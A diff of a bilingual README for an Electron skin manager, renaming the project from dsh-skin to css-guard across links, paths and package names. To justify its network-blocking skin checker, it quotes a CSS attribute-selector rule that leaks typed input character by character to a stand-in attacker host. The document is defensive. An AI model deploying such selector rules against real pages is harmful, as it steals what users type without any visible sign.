@@ -2,13 +2,13 @@
 
 <img src="docs/images/icon.png" width="104" alt="">
 
-# dsh-skin
+# css-guard
 
 **给 Electron 应用和网页界面换皮肤。下载、双击、装好、能用。**
 
 自带一个会拒绝安装危险皮肤的检查器，和一套「出事了怎么退回去」的救援机制
 
-[⬇ 下载安装包](https://github.com/LinzOpen/dsh-skin/releases/latest) ·
+[⬇ 下载安装包](https://github.com/LinzOpen/css-guard/releases/latest) ·
 [出问题了怎么办](#出问题了怎么办) ·
 [自己做一套皮肤](docs/skin-format.md) ·
 [给开发者](#给会写代码的人)
@@ -23,15 +23,15 @@
 
 **第一步 · 下载**
 
-去 [下载页](https://github.com/LinzOpen/dsh-skin/releases/latest)，按你的电脑选一个：
+去 [下载页](https://github.com/LinzOpen/css-guard/releases/latest)，按你的电脑选一个：
 
 | 你的电脑 | 下载这个文件 |
 |---|---|
-| Mac（2020 年之后买的，M1/M2/M3/M4 芯片） | `dsh-skin-<版本>-mac-arm64.dmg` |
-| Mac（更早的，Intel 芯片） | `dsh-skin-<版本>-mac-x64.dmg` |
-| Windows | `dsh-skin-Setup-<版本>-x64.exe` |
-| Windows（不想装，想放 U 盘里直接用） | `dsh-skin-<版本>-win-x64.zip` |
-| Linux | `dsh-skin-<版本>-linux-x86_64.AppImage` |
+| Mac（2020 年之后买的，M1/M2/M3/M4 芯片） | `css-guard-<版本>-mac-arm64.dmg` |
+| Mac（更早的，Intel 芯片） | `css-guard-<版本>-mac-x64.dmg` |
+| Windows | `css-guard-Setup-<版本>-x64.exe` |
+| Windows（不想装，想放 U 盘里直接用） | `css-guard-<版本>-win-x64.zip` |
+| Linux | `css-guard-<版本>-linux-x86_64.AppImage` |
 
 > 不确定自己的 Mac 是哪种？左上角苹果标 → 「关于本机」，写着 **Apple M…** 就选 arm64，写着 **Intel** 就选 x64。
 
@@ -44,7 +44,7 @@ Windows：双击 `.exe`，一路下一步。
 
 这个软件**没有花钱买代码签名证书**，所以系统第一次会拦一下。这是正常的，不是病毒：
 
-- **Mac**：在「应用程序」里找到 dsh-skin，**右键点它 → 打开 → 再点一次「打开」**。
+- **Mac**：在「应用程序」里找到 css-guard，**右键点它 → 打开 → 再点一次「打开」**。
   （直接双击会说「已损坏」或「无法验证开发者」—— 右键打开是苹果给的正规放行方式，只需要做这一次。）
 - **Windows**：出现蓝色的「Windows 已保护你的电脑」时，点 **「更多信息」→「仍要运行」**。
 
@@ -84,7 +84,7 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 一个字符一条规则，命中一次就发一个请求，你输入框里的内容被一个字母一个字母地送走 ——
 全程没有 JavaScript，没有任何弹窗，屏幕上什么都看不出来。
 
-所以 dsh-skin **拒绝套用任何会访问网络的皮肤**。是拦下来，不是提醒一下。
+所以 css-guard **拒绝套用任何会访问网络的皮肤**。是拦下来，不是提醒一下。
 （[为什么一个样式表需要检查器](docs/security.md)）
 
 它还会拦另外两种「现在能用、迟早出事」的写法：铺满窗口的永不停止动画
@@ -117,8 +117,8 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 
 还是不行的话，打开你电脑上的这个文件夹：
 
-- Mac：访达 → 菜单栏「前往」→「前往文件夹」→ 粘贴 `~/.dsh-skin/急救`
-- Windows：文件资源管理器地址栏粘贴 `%USERPROFILE%\.dsh-skin\急救`
+- Mac：访达 → 菜单栏「前往」→「前往文件夹」→ 粘贴 `~/.css-guard/急救`
+- Windows：文件资源管理器地址栏粘贴 `%USERPROFILE%\.css-guard\急救`
 
 里面按编号排好了几个文件，**双击就行，不需要输入任何东西**：
 
@@ -136,7 +136,7 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 
 把「1 看看出了什么问题」窗口里的全部文字复制下来，连同下面这句话发给它：
 
-> 这是 dsh-skin 的体检输出，请告诉我每一条是什么意思、下一步该双击哪个文件。
+> 这是 css-guard 的体检输出，请告诉我每一条是什么意思、下一步该双击哪个文件。
 > 不要让我删除任何文件。
 
 更完整的说明（也包括给 AI 助手看的操作契约）：[docs/agent-recovery.md](docs/agent-recovery.md)
@@ -145,7 +145,7 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 
 - **每次改动之前自动存一个还原点**（套用皮肤、新建、导入、删除都会），不需要你记得。
 - **回退永远不删东西** —— 只写回和补建。还原点之后新增的皮肤会原样保留。
-- 你自己做的皮肤都在 `~/.dsh-skin/skins` 里，上面所有操作都不会碰它们。
+- 你自己做的皮肤都在 `~/.css-guard/skins` 里，上面所有操作都不会碰它们。
 
 ---
 
@@ -154,9 +154,9 @@ input[value^="a"] { background: url(https://坏人的服务器/?a); }
 ### 自己做一套皮肤
 
 ```bash
-npx @dsh-skin/cli new my-skin      # 生成骨架
-npx @dsh-skin/cli validate skins   # 检查，有 error 退出码 1，可直接当 CI 闸门
-npx @dsh-skin/cli pack skins/my-skin   # 打成 zip 分享
+npx @css-guard/cli new my-skin      # 生成骨架
+npx @css-guard/cli validate skins   # 检查，有 error 退出码 1，可直接当 CI 闸门
+npx @css-guard/cli pack skins/my-skin   # 打成 zip 分享
 ```
 
 格式一页写完：[docs/skin-format.md](docs/skin-format.md)
@@ -164,7 +164,7 @@ npx @dsh-skin/cli pack skins/my-skin   # 打成 zip 分享
 ### 让你自己的 Electron 应用能换皮肤
 
 ```js
-const { registerSkinScheme, createSkinHost } = require("@dsh-skin/host");
+const { registerSkinScheme, createSkinHost } = require("@css-guard/electron");
 
 registerSkinScheme();                                  // app ready 之前
 
@@ -179,15 +179,15 @@ await skins.apply("midnight-harbor");
 ### 从源码跑 / 参与
 
 ```bash
-git clone https://github.com/LinzOpen/dsh-skin.git
-cd dsh-skin && npm install && npm start
+git clone https://github.com/LinzOpen/css-guard.git
+cd css-guard && npm install && npm start
 ```
 
 ```bash
 npm run check                                 # 仓库自检 + 单元测试 + 皮肤校验
 npx electron app/test/smoke.js                # 程序端到端（真 Electron）
 npx electron packages/host/test/smoke.js      # SDK 端到端
-docker build -f Dockerfile.test -t dsh-skin-test .   # 干净 Linux 容器里跑全量
+docker build -f Dockerfile.test -t css-guard-test .   # 干净 Linux 容器里跑全量
 ```
 
 CI 在 ubuntu / macOS / windows 三个平台重复跑同一套。踩过的坑写在 [AGENTS.md](AGENTS.md)。
@@ -225,12 +225,12 @@ adapters/       DSH 插件适配器。
 
 ## What it is
 
-A skin is a folder: `skin.json` + `skin.css` + whatever images it needs. `dsh-skin` is three things
+A skin is a folder: `skin.json` + `skin.css` + whatever images it needs. `css-guard` is three things
 that make those folders useful.
 
 **A desktop app.** Download, double-click, install. It works with nothing else installed — the live
 preview runs against a built-in mock UI, so you can see and author skins on a clean machine.
-Grab a build from [Releases](https://github.com/LinzOpen/dsh-skin/releases/latest); they are **not
+Grab a build from [Releases](https://github.com/LinzOpen/css-guard/releases/latest); they are **not
 code-signed**, so on first launch right-click → *Open* on macOS, or *More info* → *Run anyway* on
 Windows.
 
@@ -244,7 +244,7 @@ type*:
 input[value^="a"] { background: url(https://attacker.example/?a); }
 ```
 
-One rule per character, one request per hit, no JavaScript involved. `dsh-skin` refuses to inject any
+One rule per character, one request per hit, no JavaScript involved. `css-guard` refuses to inject any
 skin that reaches the network — a block, not a warning. It also catches the two failure modes that
 make skins rot: full-window `infinite` animations (measured: **2.5% → 111% CPU** on one host) and
 selectors hooked to compiled class names like `.pI_x6G_frame`.
@@ -260,7 +260,7 @@ it does not write code.
   the snapshot is left alone and listed. Undo cannot become the second accident.
 - **It shows you what it will do first.** Dry run until you confirm.
 - **Two failed launches trip safe mode automatically.** Nothing to click.
-- **A `~/.dsh-skin/急救` folder of double-clickable scripts** drives all of this without a terminal
+- **A `~/.css-guard/急救` folder of double-clickable scripts** drives all of this without a terminal
   and without Node installed — they invoke the app's own runtime.
 - **`doctor --json` is written for an agent to read.** Every non-ok finding carries the command that
   fixes it, so the next agent can pick up a situation it did not create.
@@ -270,7 +270,7 @@ Full contract: [docs/agent-recovery.md](docs/agent-recovery.md)
 ## For developers
 
 ```js
-const { registerSkinScheme, createSkinHost } = require("@dsh-skin/host");
+const { registerSkinScheme, createSkinHost } = require("@css-guard/electron");
 registerSkinScheme();                                  // before app.whenReady()
 const skins = createSkinHost({ roots: [skinsDir] });   // after
 skins.install();
